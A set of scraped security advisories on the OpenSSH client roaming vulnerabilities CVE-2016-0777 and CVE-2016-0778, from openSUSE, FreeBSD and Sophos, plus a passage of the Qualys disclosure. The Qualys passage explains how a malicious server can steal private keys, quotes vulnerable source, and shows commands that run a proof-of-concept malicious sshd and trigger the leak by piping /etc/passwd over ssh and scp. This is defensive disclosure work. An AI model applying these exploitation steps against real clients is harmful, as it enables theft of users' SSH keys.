Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q/#KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q)

# [security-announce] openSUSE-SU-2016:0128-1: critical: Security update for openssh

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

15 Jan
2016

15 Jan
'16

02:11

openSUSE Security Update: Security update for openssh
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2016:0128-1
Rating: critical
References: #961642 #961645
Cross-References: CVE-2016-0777 CVE-2016-0778
Affected Products:
openSUSE Leap 42.1
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes two vulnerabilities is now available.
Description:
This update for openssh fixes the following issues:
- CVE-2016-0777: A malicious or compromised server could cause the OpenSSH
client to expose part or all of the client's private key through the
roaming feature (bsc#961642)
- CVE-2016-0778: A malicious or compromised server could could trigger a
buffer overflow in the OpenSSH client through the roaming feature
(bsc#961645)
This update disables the undocumented feature supported by the OpenSSH
client and a commercial SSH server.
This update was imported from the SUSE:SLE-12:Update update project.
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE Leap 42.1:
zypper in -t patch openSUSE-2016-38=1
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE Leap 42.1 (i586 x86\_64):
openssh-6.6p1-8.1
openssh-askpass-gnome-6.6p1-8.1
openssh-askpass-gnome-debuginfo-6.6p1-8.1
openssh-cavs-6.6p1-8.1
openssh-cavs-debuginfo-6.6p1-8.1
openssh-debuginfo-6.6p1-8.1
openssh-debugsource-6.6p1-8.1
openssh-fips-6.6p1-8.1
openssh-helpers-6.6p1-8.1
openssh-helpers-debuginfo-6.6p1-8.1
References:
<https://www.suse.com/security/cve/CVE-2016-0777.html>
<https://www.suse.com/security/cve/CVE-2016-0778.html>
<https://bugzilla.suse.com/961642>
<https://bugzilla.suse.com/961645>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q/#KG22AHWOUP3O2CQJXLG3TPW4BOFPPN5Q)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from security.FreeBSD.org_70443ea1_20250125_234749.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
=============================================================================
FreeBSD-SA-16:07.openssh Security Advisory
The FreeBSD Project
Topic: OpenSSH client information leak
Category: contrib
Module: openssh
Announced: 2016-01-14
Credits: Qualys Security Advisory Team
Affects: All supported versions of FreeBSD.
Corrected: 2016-01-14 22:42:43 UTC (stable/10, 10.2-STABLE)
2016-01-14 22:45:33 UTC (releng/10.2, 10.2-RELEASE-p10)
2016-01-14 22:47:54 UTC (releng/10.1, 10.1-RELEASE-p27)
2016-01-14 22:50:35 UTC (stable/9, 9.3-STABLE)
2016-01-14 22:53:07 UTC (releng/9.3, 9.3-RELEASE-p34)
CVE Name: CVE-2016-0777
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
I. Background
OpenSSH is an implementation of the SSH protocol suite, providing an
encrypted and authenticated transport for a variety of services,
including remote shell access. The ssh(1) is client side utility used
to login to remote servers.
II. Problem Description
The OpenSSH client code contains experimental support for resuming SSH
connections (roaming). The matching server code has never been shipped, but
the client code was enabled by default and could be tricked by a malicious
server into leaking client memory to the server, including private client
user keys.
III. Impact
A user that authenticates to a malicious or compromised server may reveal
private data, including the private SSH key of the user.
IV. Workaround
The vulnerable code in the client can be completely disabled by adding
'UseRoaming no' to the global ssh\_config(5) file, or to user configuration
in ~/.ssh/config, or by passing -oUseRoaming=no on the command line.
All current remote ssh(1) sessions need to be restared after changing
the configuration file.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to a supported FreeBSD stable or
release / security branch (releng) dated after the correction date.
2) To update your vulnerable system via a binary patch:
Systems running a RELEASE version of FreeBSD on the i386 or amd64
platforms can be updated via the freebsd-update(8) utility:
# freebsd-update fetch
# freebsd-update install
3) To update your vulnerable system via a source code patch:
The following patches have been verified to apply to the applicable
FreeBSD release branches.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
# fetch https://security.FreeBSD.org/patches/SA-16:07/openssh.patch
# fetch https://security.FreeBSD.org/patches/SA-16:07/openssh.patch.asc
# gpg --verify openssh.patch.asc
b) Apply the patch. Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
c) Recompile the operating system using buildworld and installworld as
described in .
VI. Correction details
The following list contains the correction revision numbers for each
affected branch.
Branch/path Revision
- -------------------------------------------------------------------------
stable/9/ r294053
releng/9.3/ r294054
stable/10/ r294049
releng/10.1/ r294051
releng/10.2/ r294052
- -------------------------------------------------------------------------
To see which files were modified by a particular revision, run the
following command, replacing NNNNNN with the revision number, on a
machine with Subversion installed:
# svn diff -cNNNNNN --summarize svn://svn.freebsd.org/base
Or visit the following URL, replacing NNNNNN with the revision number:
VII. References
The latest revision of this advisory is available at
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJWmH8uAAoJEO1n7NZdz2rnZ3MQAMPm2/+gM/83HbibOzRXfo7v
4D3j93BOEGltCQx8y+Stu3Y/CNA6eRYVPvD0u65DeO2bevQcYPQbfHSa5fxYgjWQ
yqmLAvB+KZyGxAWZZhXsOWS6oUsK6y75jaWho3Oq19VLps8CWqHauvIyk0b1z/KA
IlYYcXOdAvDgLoZHVcLbKU0jdOvMmc/iwxhx0aPVu4D2LXIr59xQcA/AsbKobk5V
oqWt5CaaiZCXmVaw9eQhqNuXYC3zoY2/eh8FKG6IkIH9eyL6qQUIxumluxcui1MZ
25tZjp+OsmpVLgWxUyKKyQOVj3rRjaiRBwyUMUk+87GwmW+5b71UYjtVfQw9KHf1
KjGfylhu1oFcw5vCiul9xMm5jtBweqly1U1GEigybkDzaRNM3wheaOjWJVplU9Ku
pNYZJo7cBi19KztUUyF9AUroAdVGVO4fzRtHxWUPIBxXFpgvlXijw/AMckTGcqWy
TcEh45zSs2TScP1F8GeLPvmWUFbcChTCYWUIzFVUakEVeM5iRmx6B9qMFcN7YUS7
aFiraTIJFhaYrBbKK95CMfFvDAXwe+tBoGfLjXIfZdHcrmB6jkDyUue8ItopsAS0
hozJQUgcnZzzG+KcWODEB2xMdZSqldUoztDXJII3aisCf39ZXN5IFNJHti13tc8l
Lw/p7lOx/U4SIq+QNqqy
=EApM
-----END PGP SIGNATURE-----


=== Content from blogs.sophos.com_041a48cd_20250125_234737.html ===


[Skip to content](#content)

Search

* [Products & Services](https://news.sophos.com/en-us/category/products-services/)
* [Security Operations](https://news.sophos.com/en-us/category/security-operations/)
* [Threat Research](https://news.sophos.com/en-us/category/threat-research/)
* [AI Research](https://news.sophos.com/en-us/category/ai-research/)
* [Naked Security](https://news.sophos.com/en-us/category/serious-security/)
* [Sophos Life](https://news.sophos.com/en-us/category/sophos-life/)

Search

Open main menu

Search

* [Products & Services](https://news.sophos.com/en-us/category/products-services/)
* [Security Operations](https://news.sophos.com/en-us/category/security-operations/)
* [Threat Research](https://news.sophos.com/en-us/category/threat-research/)
* [AI Research](https://news.sophos.com/en-us/category/ai-research/)
* [Naked Security](https://news.sophos.com/en-us/category/serious-security/)
* [Sophos Life](https://news.sophos.com/en-us/category/sophos-life/)

# UTM Up2Date 9.354 released

Written by
[Alan Toews](https://news.sophos.com/en-us/author/alanctoews/ "Posts by Alan Toews")

[February 17, 2016](https://news.sophos.com/en-us/2016/02/17/utm-up2date-9-354-released/)
[Network](https://news.sophos.com/en-us/category/products-services/network/) [up2date](https://news.sophos.com/en-us/tag/up2date/) [UTM](https://news.sophos.com/en-us/tag/unified-threat-management/) [UTM 9](https://news.sophos.com/en-us/tag/utm-9/) [UTM 9.3](https://news.sophos.com/en-us/tag/utm-9-3/)

![UTM Up2Date](https://news.sophos.com/wp-content/uploads/2014/05/nsg.png)We’ve just released a new Up2Date package for all UTM 9.353 users, which provides a security update for all 9.35x users.

Read on for details about this release.

### News

* Security Update

### Remarks

* System will be rebooted

### Bugfixes

* 36136 ISC DHCP security update (CVE-2015-8605)
* 36201 Bind Vulnerability CVE-2015-8000
* 36266 OpenSSH security update (CVE-2016-0777, CVE-2016-0778)
* 36281 XSS vulnerability in mod\_url\_hardening [9.35]
* 36282 XSS vulnerability in mod\_avscan [9.35]

| ftp link: | ftp://ftp.astaro.com/UTM/v9/up2date/u2d-sys-9.353004-354004.tgz.gpg |
| --- | --- |
| Up2date MD5sum: | ``` e9ae9a5d308c48a1d247024e4b8649fc ``` |
| File size: | ~3.89 MB |

**Up2Date Installation**

Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.

There are two ways to apply an already-downloaded Up2Date package to the system:

1. Log on to WebAdmin, navigate to Management > Up2Date > Overview and use “Update to latest version now” to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
2. Download the Up2Date package from our HTTP or FTP Server and install it under Management > Up2Date > Advanced.

If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our [User Bulletin Board](https://community.sophos.com/products/unified-threat-management/ "User Bulletin Board"). Please indicate the version you are using to help us (and everyone helping you).

**Feedback**

* If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
* You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!
* If you have any questions or comments regarding this release, please see our [online forums](https://community.sophos.com/products/unified-threat-management/f/52 "UTM community forum") for more information.

Alan Toews

Technical Product Manager

* [Share on Facebook](http://www.facebook.com/share.php?u=https://news.sophos.com/?p=30859&title=UTM%20Up2Date%209.354%20released "Share on Facebook")
* [Share on X](http://twitter.com/intent/tweet?text=UTM%20Up2Date%209.354%20released%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D30859 "Share on X")
* [Share on LinkedIn](http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2016/02/17/utm-up2date-9-354-released/ "Share on LinkedIn")
* [3](#comments "Leave a Reply")

![](https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png)
About the Author
### [Alan Toews](https://news.sophos.com/en-us/author/alanctoews/ "Posts by Alan Toews")

### Read Similar Articles

May 24, 2021
## [What to expect when you’ve been hit with Avaddon ransomware](https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/)

May 19, 2021
## [What’s New in Sophos EDR 4.0](https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/)

May 19, 2021
## [Sophos XDR: Driven by data](https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/)

## 3 Comments

![](https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png)
## Lisa Starbuck

[17 February 2016 at 2:05 pm](#comment-6698)

When will Sophos address CVE-2015-7547?

![](https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png)
## Michael

[18 February 2016 at 3:59 am](#comment-6704)

Will there be another update for the current glibc bug?

![](https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png)
## [Alan Toews](http://alantoewsblog.wordpress.com)

[18 February 2016 at 1:48 pm](#comment-6712)

Please note that this update does not address glibc (CVE-2015-7547) That patch is currently in testing, and can be expected as soon as next week. We have posted a kb where you may track the status of this: https://www.sophos.com/en-us/support/knowledgebase/123675.aspx

At the time of posting, it conservatively lists the expected date as being more than one week out – however, that is a very conservative estimate, should there be any problems in testing. I am looking for 9.355 next week to address this.

Comments are closed.

Subscribe to get the latest updates in your inbox.

Which categories are you interested in?

* Products and Services
* Threat Research
* Security Operations
* AI Research
* #SophosLife

Change Region

* [América Latina](https://news.sophos.com/es-419)
* [Brasil](https://news.sophos.com/pt-br)
* [Deutschland](https://news.sophos.com/de-de)
* [English](https://news.sophos.com/en-us)
* [France](https://news.sophos.com/fr-fr)
* [Iberia](https://news.sophos.com/es-es)
* [Italia](https://news.sophos.com/it-it)
* [Japan](https://news.sophos.com/ja-jp)

[Terms](https://www.sophos.com/en-us/legal/sophos-website.aspx)

Privacy

* [Privacy Notice](https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx)
* [Cookies](https://www.sophos.com/en-us/legal/cookie-information.aspx)

Legal

* [General](https://www.sophos.com/en-us/legal.aspx)
* [Modern Slavery Statement](https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx)
* [Speak Out](https://secure.ethicspoint.eu/domain/media/en/gui/104916/index.html)

© 1997 - 2025 Sophos Ltd. All rights reserved

[Go to mobile version](https://news.sophos.com/en-us/2016/02/17/utm-up2date-9-354-released/?amp=1)



=== Content from www.openwall.com_4ddd2374_20250125_234732.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](6) [[next>]](8) [[thread-next>]](9) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20160114171301.GH28298@localhost.localdomain>
Date: Thu, 14 Jan 2016 09:13:01 -0800
From: Qualys Security Advisory <qsa@...lys.com>
To: oss-security@...ts.openwall.com
Subject: Qualys Security Advisory - Roaming through the OpenSSH client:
 CVE-2016-0777 and CVE-2016-0778

Qualys Security Advisory

Roaming through the OpenSSH client: CVE-2016-0777 and CVE-2016-0778

========================================================================
Contents
========================================================================

Summary
Information Leak (CVE-2016-0777)
- Analysis
- Private Key Disclosure
- Mitigating Factors
- Examples
Buffer Overflow (CVE-2016-0778)
- Analysis
- Mitigating Factors
- File Descriptor Leak
Acknowledgments
Proof Of Concept

========================================================================
Summary
========================================================================

Since version 5.4 (released on March 8, 2010), the OpenSSH client
supports an undocumented feature called roaming: if the connection to an
SSH server breaks unexpectedly, and if the server supports roaming as
well, the client is able to reconnect to the server and resume the
suspended SSH session.

Although roaming is not supported by the OpenSSH server, it is enabled
by default in the OpenSSH client, and contains two vulnerabilities that
can be exploited by a malicious SSH server (or a trusted but compromised
server): an information leak (memory disclosure), and a buffer overflow
(heap-based).

The information leak is exploitable in the default configuration of the
OpenSSH client, and (depending on the client's version, compiler, and
operating system) allows a malicious SSH server to steal the client's
private keys. This information leak may have already been exploited in
the wild by sophisticated attackers, and high-profile sites or users may
need to regenerate their SSH keys accordingly.

The buffer overflow, on the other hand, is present in the default
configuration of the OpenSSH client but its exploitation requires two
non-default options: a ProxyCommand, and either ForwardAgent (-A) or
ForwardX11 (-X). This buffer overflow is therefore unlikely to have any
real-world impact, but provides a particularly interesting case study.

All OpenSSH versions between 5.4 and 7.1 are vulnerable, but can be
easily hot-fixed by setting the undocumented option "UseRoaming" to
"no", as detailed in the Mitigating Factors section. OpenSSH version
7.1p2 (released on January 14, 2016) disables roaming by default.

========================================================================
Information Leak (CVE-2016-0777)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

If the OpenSSH client connects to an SSH server that offers the key
exchange algorithm "resume@...gate.com", it sends the global request
"roaming@...gate.com" to the server, after successful authentication. If
this request is accepted, the client allocates a roaming buffer out_buf,
by calling malloc() (and not calloc()) with an out_buf_size that is
arbitrarily chosen by the server:

 63 void
 64 roaming_reply(int type, u_int32_t seq, void *ctxt)
 65 {
 66         if (type == SSH2_MSG_REQUEST_FAILURE) {
 67                 logit("Server denied roaming");
 68                 return;
 69         }
 70         verbose("Roaming enabled");
 ..
 75         set_out_buffer_size(packet_get_int() + get_snd_buf_size());
 ..
 77 }

 40 static size_t out_buf_size = 0;
 41 static char *out_buf = NULL;
 42 static size_t out_start;
 43 static size_t out_last;
 ..
 75 void
 76 set_out_buffer_size(size_t size)
 77 {
 78         if (size == 0 || size > MAX_ROAMBUF)
 79                 fatal("%s: bad buffer size %lu", __func__, (u_long)size);
 80         /*
 81          * The buffer size can only be set once and the buffer will live
 82          * as long as the session lives.
 83          */
 84         if (out_buf == NULL) {
 85                 out_buf_size = size;
 86                 out_buf = xmalloc(size);
 87                 out_start = 0;
 88                 out_last = 0;
 89         }
 90 }

The OpenSSH client's roaming_write() function, a simple wrapper around
write(), calls wait_for_roaming_reconnect() to transparently reconnect
to the SSH server after a disconnection. It also calls buf_append() to
copy the data sent to the server into the roaming buffer out_buf. During
a reconnection, the client is therefore able to resend the data that was
not received by the server because of the disconnection:

198 void
199 resend_bytes(int fd, u_int64_t *offset)
200 {
201         size_t available, needed;
202
203         if (out_start < out_last)
204                 available = out_last - out_start;
205         else
206                 available = out_buf_size;
207         needed = write_bytes - *offset;
208         debug3("resend_bytes: resend %lu bytes from %llu",
209             (unsigned long)needed, (unsigned long long)*offset);
210         if (needed > available)
211                 fatal("Needed to resend more data than in the cache");
212         if (out_last < needed) {
213                 int chunkend = needed - out_last;
214                 atomicio(vwrite, fd, out_buf + out_buf_size - chunkend,
215                     chunkend);
216                 atomicio(vwrite, fd, out_buf, out_last);
217         } else {
218                 atomicio(vwrite, fd, out_buf + (out_last - needed), needed);
219         }
220 }

In the OpenSSH client's roaming buffer out_buf, the most recent data
sent to the server begins at index out_start and ends at index out_last.
As soon as this circular buffer is full, buf_append() maintains the
invariant "out_start = out_last + 1", and consequently three different
cases have to be considered:

- "out_start < out_last" (lines 203-204): out_buf is not full yet (and
  out_start is still equal to 0), and the amount of data available in
  out_buf is indeed "out_last - out_start";

- "out_start > out_last" (lines 205-206): out_buf is full (and out_start
  is exactly equal to "out_last + 1"), and the amount of data available
  in out_buf is indeed the entire out_buf_size;

- "out_start == out_last" (lines 205-206): no data was ever written to
  out_buf (and both out_start and out_last are still equal to 0) because
  no data was ever sent to the server after roaming_reply() was called,
  but the client sends (leaks) the entire uninitialized out_buf to the
  server (line 214), as if out_buf_size bytes of data were available.

In order to successfully exploit this information leak and retrieve
sensitive information from the OpenSSH client's memory (for example,
private SSH keys, or memory addresses useful for further exploitation),
a malicious server needs to:

- Massage the client's heap before roaming_reply() malloc()ates out_buf,
  and force malloc() to return a previously free()d but uncleansed chunk
  of sensitive information. The simple proof-of-concept in this advisory
  does not implement heap massaging.

- Guess the client's get_snd_buf_size() in order to precisely control
  out_buf_size. OpenSSH < 6.0 accepts out_buf sizes in the range (0,4G),
  and OpenSSH >= 6.0 accepts sizes in the range (0,2M]. Sizes smaller
  than get_snd_buf_size() are attainable because roaming_reply() does
  not protect "packet_get_int() + get_snd_buf_size()" against integer
  wraparound. The proof-of-concept in this advisory attempts to derive
  the client's get_snd_buf_size() from the get_recv_buf_size() sent by
  the client to the server, and simply chooses a random out_buf_size.

- Advise the client's resend_bytes() that all "available" bytes (the
  entire out_buf_size) are "needed" by the server, even if fewer bytes
  were actually written by the client to the server (because the server
  controls the "*offset" argument, and resend_bytes() does not protect
  "needed = write_bytes - *offset" against integer wraparound).

Finally, a brief digression on a minor bug in resend_bytes(): on 64-bit
systems, where "chunkend" is a 32-bit signed integer, but "out_buf" and
"out_buf_size" are 64-bit variables, "out_buf + out_buf_size - chunkend"
may point out-of-bounds, if chunkend is negative (if out_buf_size is in
the [2G,4G) range). This negative chunkend is then converted to a 64-bit
size_t greater than SSIZE_MAX when passed to atomicio(), and eventually
returns EFAULT when passed to write() (at least on Linux and OpenBSD),
thus avoiding an out-of-bounds read from the OpenSSH client's memory.

------------------------------------------------------------------------
Private Key Disclosure
------------------------------------------------------------------------

We initially believed that this information leak in the OpenSSH client's
roaming code would not allow a malicious SSH server to steal the
client's private keys, because:

- the information leaked is not read from out-of-bounds memory, but from
  a previously free()d chunk of memory that is recycled to malloc()ate
  the client's roaming buffer out_buf;

- private keys are loaded from disk into memory and freed by key_free()
  (old API, OpenSSH < 6.7) or sshkey_free() (new API, OpenSSH >= 6.7),
  and both functions properly cleanse the private keys' memory with
  OPENSSL_cleanse() or explicit_bzero();

- temporary copies of in-memory private keys are freed by buffer_free()
  (old API) or sshbuf_free() (new API), and both functions attempt to
  cleanse these copies with memset() or bzero().

However, we eventually identified three reasons why, in our experiments,
we were able to partially or completely retrieve the OpenSSH client's
private keys through this information leak (depending on the client's
version, compiler, operating system, heap layout, and private keys):

(besides these three reasons, other reasons may exist, as suggested by
the CentOS and Fedora examples at the end of this section)

1. If a private SSH key is loaded from disk into memory by fopen() (or
fdopen()), fgets(), and fclose(), a partial or complete copy of this
private key may remain uncleansed in memory. Indeed, these functions
manage their own internal buffers, and whether these buffers are
cleansed or not depends on the OpenSSH client's libc (stdio)
implementation, but not on OpenSSH itself.

- In all vulnerable OpenSSH versions, SSH's main() function calls
  load_public_identity_files(), which loads the client's public keys
  with fopen(), fgets(), and fclose(). Unfortunately, the private keys
  (without the ".pub" suffix) are loaded first and then discarded, but
  nonetheless buffered in memory by the stdio functions.

- In OpenSSH versions <= 5.6, the load_identity_file() function (called
  by the client's public-key authentication method) loads a private key
  with fdopen() and PEM_read_PrivateKey(), an OpenSSL function that uses
  fgets() and hence internal stdio buffering.

Internal stdio buffering is the most severe of the three problems
discussed in this section, although GNU/Linux is not affected because
the glibc mmap()s and munmap()s (and therefore cleanses) stdio buffers.
BSD-based systems, on the other hand, are severely affected because they
simply malloc()ate and free() stdio buffers. For interesting comments on
this issue:

[https://www.securecoding.cert.org/confluence/display/c/MEM06-C.+Ensure+that+sensitive+data+is+not+written+out+to+disk](https://www.securecoding.cert.org/confluence/display/c/MEM06-C.%2BEnsure%2Bthat%2Bsensitive%2Bdata%2Bis%2Bnot%2Bwritten%2Bout%2Bto%2Bdisk)

2. In OpenSSH versions >= 5.9, the client's load_identity_file()
function (called by the public-key authentication method) read()s a
private key in 1024-byte chunks that are appended to a growing buffer (a
realloc()ating buffer) with buffer_append() (old API) or sshbuf_put()
(new API). Unfortunately, the repeated calls to realloc() may leave
partial copies of the private key uncleansed in memory.

- In OpenSSH < 6.7 (old API), the initial size of such a growing buffer
  is 4096 bytes: if a private-key file is larger than 4K, a partial copy
  of this private key may remain uncleansed in memory (a 3K copy in a 4K
  buffer). Fortunately, only the file of a very large RSA key (for
  example, an 8192-bit RSA key) can exceed 4K.

- In OpenSSH >= 6.7 (new API), the initial size of a growing buffer is
  256 bytes: if a private-key file is larger than 1K (the size passed to
  read()), a partial copy of this private key may remain uncleansed in
  memory (a 1K copy in a 1K buffer). For example, the file of a
  default-sized 2048-bit RSA key exceeds 1K.

For more information on this issue:

[https://www.securecoding.cert.org/confluence/display/c/MEM03-C.+Clear+sensitive+information+stored+in+reusable+resources](https://www.securecoding.cert.org/confluence/display/c/MEM03-C.%2BClear%2Bsensitive%2Binformation%2Bstored%2Bin%2Breusable%2Bresources)

<https://cwe.mitre.org/data/definitions/244.html>

3. An OpenSSH growing-buffer that holds a private key is eventually
freed by buffer_free() (old API) or sshbuf_free() (new API), and both
functions attempt to cleanse the buffer with memset() or bzero() before
they call free(). Unfortunately, an optimizing compiler may remove this
memset() or bzero() call, because the buffer is written to, but never
again read from (an optimization known as Dead Store Elimination).

OpenSSH 6.6 is the only version that is not affected, because it calls
explicit_bzero() instead of memset() or bzero().

Dead Store Elimination is the least severe of the three problems
explored in this section, because older GCC versions do not remove the
memset() or bzero() call made by buffer_free() or sshbuf_free(). GCC 5
and Clang/LLVM do, however, remove it. For detailed discussions of this
issue:

[https://www.securecoding.cert.org/confluence/display/c/MSC06-C.+Beware+of+compiler+optimizations](https://www.securecoding.cert.org/confluence/display/c/MSC06-C.%2BBeware%2Bof%2Bcompiler%2Boptimizations)

<https://cwe.mitre.org/data/definitions/14.html>

<https://sourceware.org/ml/libc-alpha/2014-12/threads.html#00506>

Finally, for these three reasons, passphrase-encrypted SSH keys are
leaked in their encrypted form, but an attacker may attempt to crack the
passphrase offline. On the other hand, SSH keys that are available only
through an authentication agent are never leaked, in any form.

------------------------------------------------------------------------
Mitigating Factors
------------------------------------------------------------------------

This information leak affects all OpenSSH clients >= 5.4, but its impact
is slightly reduced by the following four reasons:

1. The vulnerable roaming code can be permanently disabled by adding the
undocumented option "UseRoaming no" to the system-wide configuration
file (usually /etc/ssh/ssh_config), or per-user configuration file
(~/.ssh/config), or command-line (-o "UseRoaming no").

2. If an OpenSSH client is disconnected from an SSH server that offers
roaming, it prints "[connection suspended, press return to resume]" on
stderr, and waits for '\n' or '\r' on stdin (and not on the controlling
terminal) before it reconnects to the server; advanced users may become
suspicious and press Control-C or Control-Z instead, thus avoiding the
information leak:

# "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
[connection suspended, press return to resume]^Z
[1]+  Stopped                 /usr/bin/ssh -p 222 127.0.0.1

However, SSH commands that use the local stdin to transfer data to the
remote server are bound to trigger this reconnection automatically (upon
reading a '\n' or '\r' from stdin). Moreover, these non-interactive SSH
commands (for example, backup scripts and cron jobs) commonly employ
public-key authentication and are therefore perfect targets for this
information leak:

$ ls -l /etc/passwd | /usr/bin/ssh -p 222 127.0.0.1 "cat > /tmp/passwd.ls"
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]

$ tar -cf - /etc/passwd | /usr/bin/ssh -p 222 127.0.0.1 "cat > /tmp/passwd.tar"
tar: Removing leading `/' from member names
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
...
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]

Similarly, the SCP client uses the SSH client's stdin and stdout to
transfer data, and can be forced by a malicious SSH server to output a
control record that ends in '\n' (an error message in server-to-client
mode, or file permissions in client-to-server mode); this '\n' is then
read from stdin by the fgetc() call in wait_for_roaming_reconnect(), and
triggers an automatic reconnection that allows the information leak to
be exploited without user interaction:

# env ROAMING="scp_mode sleep:1" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/scp -P 222 127.0.0.1:/etc/passwd /tmp
$ [connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]

